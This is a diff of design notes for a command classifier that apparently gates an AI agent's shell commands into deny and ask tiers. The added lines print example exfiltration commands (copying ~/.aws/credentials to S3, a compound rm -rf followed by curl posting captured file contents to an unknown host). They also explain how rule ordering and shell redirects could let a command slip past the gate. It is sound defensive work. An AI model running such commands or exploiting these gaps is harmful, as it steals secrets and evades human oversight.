@@ -52,8 +52,14 @@ dependency**. No ML models, no services, no Docker.
      so reserve it for ~zero-legit-use / exfil-signature cases: cloud-metadata,
      catastrophic `rm -rf` (a filesystem root / home / a *system dir itself* — a delete
      DEEPER under a system dir is ASK, not deny), reading a local secret into a network
-     call, uploading a local secret, and **inline-capture** exfil — `$(…)`/backtick
-     output embedded in a data upload to a host absent from the codebase. Crucially a
+     call, uploading a local secret (incl. via a cloud CLI — `aws s3 cp ~/.aws/credentials
+     s3://…`), and **inline-capture** exfil — `$(…)`/backtick output embedded in a data
+     upload to a host absent from the codebase. **The exfil denies are evaluated UP FRONT
+     (before any ASK tier) on purpose** — `_classify_bash` returns on first match, so a
+     compound command (`rm -rf ~/x && curl -d "$(cat s)" https://absent/`) would otherwise
+     let an early ASK clause mask a later deny; don't reorder them below the ASK checks.
+     A shell `>`/`>>` redirect to a control file (`_bash_redirect_hits_control_file`) is
+     also caught, since it bypasses the Write-tool gate. Crucially a
      bare token env var (`Bearer $API_TOKEN`) is NOT a deny signal — it's routine auth,
      so a token-authenticated POST to an internal host absent from committed source only
      ASKS (see `_INLINE_CAPTURE_RE` vs `_VAR_EXPANSION_RE`). **`ask`** (which DOES surface
